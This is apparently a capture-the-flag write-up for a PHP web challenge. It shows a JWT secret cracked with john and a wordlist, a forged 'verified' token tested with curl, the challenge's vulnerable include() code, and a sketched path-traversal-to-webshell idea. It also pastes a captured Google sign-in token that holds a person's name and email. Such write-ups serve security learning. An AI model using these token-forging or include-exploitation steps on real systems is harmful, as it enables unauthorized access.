
## Description

Advanced Webpage Systems (AWS) recently deployed their newest product - a static site host for Personal Home Pages (PHP)! They have even integrated Google Sign-In to make it easier and more secure. I wonder if we can hack it through the profile pic?  
https://advanced-webpage-systems.uk.to/  
https://advanced-webpage-systems.ftp.sh/

## Solution

![[Pasted image 20221203004209.png]]

Login by Google

![[Pasted image 20221203004253.png]]

Ok viewing page source

![[Pasted image 20221203004949.png]]

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Advanced Webpage Systems (AWS)</title>
  </head>

  <body style="display: flex; justify-content: center; align-items: center; margin: 0; height: 100vh; padding: 12px;">
    <form method="post" action="update.php" style="box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px; padding: 36px; border-radius: 8px; text-align: center; width: 700px; max-width: calc(100% - 64px);">
      <h1 style="margin: 0; margin-bottom: 12px;">Advanced Webpage Systems (AWS)</h1>

      <div>Welcome back, Terence Chan Zun Mun! We like your profile picture!</div>
      <div>Unverified account. Please verify to display profile picture :(</div>

      <br>
      <p style="color: #222222;">Edit your Personal Home Page here! No PHP, no ASPX. Just HTML, CSS and JS.</p>

      <textarea name="page" id="content" style="font-size: 1rem; padding: 12px; width: calc(100% - 24px); resize: vertical; min-height: 150px;" placeholder="&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;/html&gt;"></textarea>

      <br>
      <button type="submit" style="font-size: 1rem; margin: 12px 0; display: inline-block; padding: 12px;">Save!</button>
      <br>
      <a href="/" id="link-viewpage">View Page</a>
    </form>

    <script>
      const uid = "114191502239468505152";

      async function run() {
        let content = await fetch(`pages/${uid}.html`).then(res => res.text());
        document.querySelector("#content").innerHTML = content;
        document.querySelector("#link-viewpage").href = `pages/${uid}.html`;

        // unverified user :(
        // document.querySelector("#profile-picture").src = "profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6ZmFsc2UsInN1YiI6IjExNDE5MTUwMjIzOTQ2ODUwNTE1MiJ9.UGSR6lK0cPgiQfdGGOXrEzRG7YOJSlrIsIHM8WDqrN9nU6FCCriGZOoEDNye5LyTyrU400DMp7q_wsKAsVdFDA";
      }

      run();
    </script>
  </body>
</html>

```

Interesting Javascript Code here

![[Pasted image 20221203005044.png]]

## JSON Web Token? Bypass?

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6ZmFsc2UsInN1YiI6IjExNDE5MTUwMjIzOTQ2ODUwNTE1MiJ9.UGSR6lK0cPgiQfdGGOXrEzRG7YOJSlrIsIHM8WDqrN9nU6FCCriGZOoEDNye5LyTyrU400DMp7q_wsKAsVdFDA
```

![[Pasted image 20221203005211.png]]

Ok now I was going to follow the standard list of attacks on PortSwigger Academy

Then I cracked the secret using john

```bash
┌──(kali㉿kali)-[/tmp]
└─$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6ZmFsc2UsInN1YiI6IjExNDE5MTUwMjIzOTQ2ODUwNTE1MiJ9.UGSR6lK0cPgiQfdGGOXrEzRG7YOJSlrIsIHM8WDqrN9nU6FCCriGZOoEDNye5LyTyrU400DMp7q_wsKAsVdFDA" > tocrack

┌──(kali㉿kali)-[/tmp]
└─$ john tocrack --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA512
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA512 [password is key, SHA512 256/256 AVX2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0077secret0077   (?)     
1g 0:00:00:04 DONE (2022-12-02 12:01) 0.2283g/s 3255Kp/s 3255Kc/s 3255KC/s 007960..007791
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[/tmp]
└─$ 
```

I forged a valid token

![[Pasted image 20221203010355.png]]

And it worked for getting a profile pic

https://advanced-webpage-systems.ftp.sh/profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6dHJ1ZSwic3ViIjoiMTE0MTkxNTAyMjM5NDY4NTA1MTUyIn0.yXg4DQl0A6ApZSwZWKVMm1qpiO3ObZQAVpa0W5_7bGhV0WwBQliTswj4PewpbsUJn9Q1CVKxvjxsD9hJHpM0yw

![[Pasted image 20221203010421.png]]

BTW I can change `sub` and it doesnt affect


### OAuth Analysis

![[Pasted image 20221203210729.png]]

![[Pasted image 20221203210708.png]]

https://accounts.google.com/gsi/select?client_id=473907672126-20q2j1teahihpamha3t0nad4jfnot22i.apps.googleusercontent.com&ux_mode=popup&ui_mode=card&as=L7Fy8f7C%2FuP5Yyb90Mp1MA&channel_id=d1038b53f154dd53f3893bc5bd0f471ae4691af457e9f3ff084e5cdc848ff607&origin=https%3A%2F%2Fadvanced-webpage-systems.uk.to

![[Pasted image 20221203210741.png]]

payload
```
credential=eyJhbGciOiJSUzI1NiIsImtpZCI6IjE4MzkyM2M4Y2ZlYzEwZjkyY2IwMTNkMDZlMWU3Y2RkNzg3NGFlYTUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2NzAwNzI5MzksImF1ZCI6IjQ3MzkwNzY3MjEyNi0yMHEyajF0ZWFoaWhwYW1oYTN0MG5hZDRqZm5vdDIyaS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjExNDE5MTUwMjIzOTQ2ODUwNTE1MiIsImVtYWlsIjoienVubXVuQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhenAiOiI0NzM5MDc2NzIxMjYtMjBxMmoxdGVhaGlocGFtaGEzdDBuYWQ0amZub3QyMmkuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJuYW1lIjoiVGVyZW5jZSBDaGFuIFp1biBNdW4iLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUxtNXd1MDdmLUUxYXNjVFdNZTBzcjdTRHNyU0ptbkpEemN2TUx6anNiUVJBQkU9czk2LWMiLCJnaXZlbl9uYW1lIjoiVGVyZW5jZSIsImZhbWlseV9uYW1lIjoiQ2hhbiBadW4gTXVuIiwiaWF0IjoxNjcwMDczMjM5LCJleHAiOjE2NzAwNzY4MzksImp0aSI6IjAxYzFmNmE4ZjJkNzVjOTRkMGZiOTI2NGMyYzI2ZDRkNjg5YzQ5OGQifQ.Kyc6Meu3qswR3QsgSYXw2eEoFy5FeP0FG6WHqO91WyGz5Lr_rUH5dKmCwGgRBk2F41aK9skm6JQ3yt7M4_qvdYrs5m91PQs13MCzSEJQtYuGxRX5apoSGYSguNDEvGFptEL0RGx6WAO3NPBu52U6sVf3RFSx2xFtkac24Z-Vh-qh6AVS2NcGhZnIape6UNqfjT5KaQMUFVnJ57mfVWYzKRE1qljQZN-a3qGtdn_I4dmXYLQItM5xPxv5kc51Y1t1tliWDyp9_HsSrjWkQdIaZzcXBM3LnwttachwspKHDdfiIueu4i92wRhvdQhRSFAE3LXAUuvI6XDfNQ963kfsCg&g_csrf_token=1810765c1e7c0c8
```

![[Pasted image 20221203212813.png]]


### Source Code?

https://advanced-webpage-systems.uk.to/index.html

https://advanced-webpage-systems.uk.to/login.php

@everyone for the advanced web system challenge, here is the source code for profile-pic.php
```php
<?php
  session_start();
  $uid = $_SESSION["uid"];
  $verified = false;

  if (isset($_GET["token"])) {
    try {
      require("jwt.php");
  
      // token verification
      $token = $_GET["token"];
  
      $decoded = JWT::decode($token, "XXXXX", array("HS512")); //secret key is intentionally censored for this hint.
      $decoded_array = (array) $decoded;
  
      $verified = $decoded_array["verified"];
    }
    catch (Exception $e) {
      // echo $e;
      http_response_code(403);
      die("error");
    }
  }

  if ($verified === true) {
    header('Content-Type: image/png');
    include("user-img/$uid.png");
  }
  else {
    http_response_code(403);
    echo "For the safety of all our users, unverified accounts may not load their profile pictures.";
  }
?>
```

secret is `0077secret0077` btw

wait why `include`

## But now what

### Difference in endpoints

```
(base) [hacker@hackerbook Electrogrid]$ curl -v https://advanced-webpage-systems.uk.to/profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6dHJ1ZSwic3ViIjoiMTE0MTkxNTAyMjM5NDY4NTA1MTUyIn0.yXg4DQl0A6ApZSwZWKVMm1qpiO3ObZQAVpa0W5_7bGhV0WwBQliTswj4PewpbsUJn9Q1CVKxvjxsD9hJHpM0yw -k
*   Trying 172.67.141.67:443...
*   Trying 2606:4700:3036::6815:4707:443...
* Immediate connect fail for 2606:4700:3036::6815:4707: Network is unreachable
*   Trying 2606:4700:3035::ac43:8d43:443...
* Immediate connect fail for 2606:4700:3035::ac43:8d43: Network is unreachable
* Connected to advanced-webpage-systems.uk.to (172.67.141.67) port 443 (#0)
* ALPN, offering http/1.1
* error setting certificate verify locations, continuing anyway:
*   CAfile: /home/hacker/.cache/yay/anaconda/pkg/anaconda/opt/anaconda/ssl/cacert.pem
  CApath: none
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=*.advanced-webpage-systems.uk.to
*  start date: Nov 26 19:09:06 2022 GMT
*  expire date: Feb 24 19:09:05 2023 GMT
*  issuer: C=US; O=Google Trust Services LLC; CN=GTS CA 1P5
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
> GET /profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6dHJ1ZSwic3ViIjoiMTE0MTkxNTAyMjM5NDY4NTA1MTUyIn0.yXg4DQl0A6ApZSwZWKVMm1qpiO3ObZQAVpa0W5_7bGhV0WwBQliTswj4PewpbsUJn9Q1CVKxvjxsD9hJHpM0yw HTTP/1.1
> Host: advanced-webpage-systems.uk.to
> User-Agent: curl/7.71.1
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 03 Dec 2022 13:10:46 GMT
< Content-Type: image/png
< Transfer-Encoding: chunked
< Connection: keep-alive
< Host: challenge_n
< x-powered-by: PHP/7.4.33
< set-cookie: PHPSESSID=skngmlo1q9vlsjip4u871jkn5m; path=/
< expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< pragma: no-cache
< CF-Cache-Status: DYNAMIC
< Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=z%2Bc8%2BhApgKeICPxmMrHgQAAmO9XpZA6S0%2FGAx8qLiyoNwU9WH%2FMXOqvnphJ8zjFYa10B6wamqpnaqqd0xqdIQIVfm48uusyy9xPeEYARgw43DpO3b2UCWFtbYGDR50Er5lGHPEatTNKfjBR3t%2FOZ9P0%3D"}],"group":"cf-nel","max_age":604800}
< NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
< Server: cloudflare
< CF-RAY: 773c8b5e297f4bd4-SIN
< alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
< 
* Connection #0 to host advanced-webpage-systems.uk.to left intact
(base) [hacker@hackerbook Electrogrid]$ curl -v https://advanced-webpage-systems.ftp.sh/profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6dHJ1ZSwic3ViIjoiMTE0MTkxNTAyMjM5NDY4NTA1MTUyIn0.yXg4DQl0A6ApZSwZWKVMm1qpiO3ObZQAVpa0W5_7bGhV0WwBQliTswj4PewpbsUJn9Q1CVKxvjxsD9hJHpM0yw -k
*   Trying 20.187.121.185:443...
* Connected to advanced-webpage-systems.ftp.sh (20.187.121.185) port 443 (#0)
* ALPN, offering http/1.1
* error setting certificate verify locations, continuing anyway:
*   CAfile: /home/hacker/.cache/yay/anaconda/pkg/anaconda/opt/anaconda/ssl/cacert.pem
  CApath: none
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=advanced-webpage-systems.ftp.sh
*  start date: Nov 26 20:04:48 2022 GMT
*  expire date: Feb 24 20:04:47 2023 GMT
*  issuer: C=US; O=Let's Encrypt; CN=R3
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
> GET /profile-pic.php?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ2ZXJpZmllZCI6dHJ1ZSwic3ViIjoiMTE0MTkxNTAyMjM5NDY4NTA1MTUyIn0.yXg4DQl0A6ApZSwZWKVMm1qpiO3ObZQAVpa0W5_7bGhV0WwBQliTswj4PewpbsUJn9Q1CVKxvjxsD9hJHpM0yw HTTP/1.1
> Host: advanced-webpage-systems.ftp.sh
> User-Agent: curl/7.71.1
> Accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 03 Dec 2022 13:10:55 GMT
< Content-Type: image/png
< Transfer-Encoding: chunked
< Connection: keep-alive
< Host: 127.0.0.1:8024
< X-Powered-By: PHP/7.4.33
< Set-Cookie: PHPSESSID=r94uffi8rvltj4o51a09ersblb; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host advanced-webpage-systems.ftp.sh left intact
(base) [hacker@hackerbook Electrogrid]$ 
```

### Other differences in endpoints

Ok 1 is cloudflare 1 isn't

They have separate storage things per google account - the webpage tracks google account not sessions

uid is the same

114191502239468505152
114191502239468505152


# Ok potential exploit - NOT

1. `uid` is vulnerable to an exploit - can `../pages/$uid.html` to run custom php code (RCE, because of `includes`)
2. Can customise `$uid` to allow for a webshell

# Flag
